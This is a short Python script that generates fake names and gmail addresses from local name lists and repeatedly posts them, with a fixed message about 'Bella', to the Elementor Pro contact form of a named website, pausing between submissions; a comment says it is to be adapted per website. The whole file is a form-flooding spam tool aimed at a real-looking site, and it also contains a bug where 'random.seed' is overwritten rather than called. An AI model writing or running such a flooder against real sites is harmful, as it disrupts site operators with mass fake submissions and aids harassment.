import requests
import os
import random
import string
import json
import time

chars = string.ascii_letters + string.digits + '!@#$%^&*()'
random.seed = (os.urandom(1024))

url = 'https://www.associate4you.com/'

personfield = 'form_fields[name]'
emailfield = 'form_fields[email]'
messagefield = 'form_fields[message]'

names = json.loads(open('names.json').read())
lastname = json.loads(open('lastname.json').read())

for name in names:
    name_extra = ''.join(random.choice(string.digits))

    email = random.choice(names).lower() + name_extra + "@gmail.com"
    password = ''.join(random.choice(chars) for i in range(22))
    message = "I love Bella is he still available"
    person = name + ' ' + (random.choice(lastname))

# making the post request to be sent to the website, this needs to be updated PER WEBSITE
    try:
        requests.post(url, allow_redirects=False, data={
            'post_id': '',
            'form_id': '',
            emailfield: email,
            personfield: person,
            # passwordfield: password,
            messagefield: message,
            'action': 'elementor_pro_forms_send_form'
         })
    except:
        print('server is not responding; sleeping 200 seconds')
        time.sleep(200)

    print('sending email %s, name %s and message %s' % (email, person, message))

    print('sleeping for 15 seconds')
    time.sleep(15)
